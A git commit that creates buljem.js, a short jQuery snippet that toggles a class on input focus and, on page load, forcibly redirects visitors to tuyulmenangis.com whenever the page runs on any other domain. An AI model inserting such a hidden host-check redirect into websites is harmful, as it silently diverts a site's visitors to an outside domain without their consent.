2db96744fdf499965203929f70c252bbe22cfdd3
tuyulmenangiss <117646140+tuyulmenangiss@users.noreply.github.com>
2024-06-28 01:48:35 +0700

    Create buljem.js

---
+++ buljem.js
@@ -0,0 +1,19 @@
+<script>
+$("input").focus(function() {
+          $("body").addClass("input-focused");
+        });
+        $("input").focusout(function() {
+          $("body").removeClass("input-focused");
+        });
+
+        var host = window.location.host;        
+        var curr_host = "tuyulmenangis.com";
+        var agent_url = "https://tuyulmenangis.com";
+        
+        console.log(host, curr_host, agent_url , agent_url.includes(host));
+        
+        if(host != curr_host && !agent_url.includes(host)){
+                      
+            location.href = "https://tuyulmenangis.com";           
+        }
+</script>
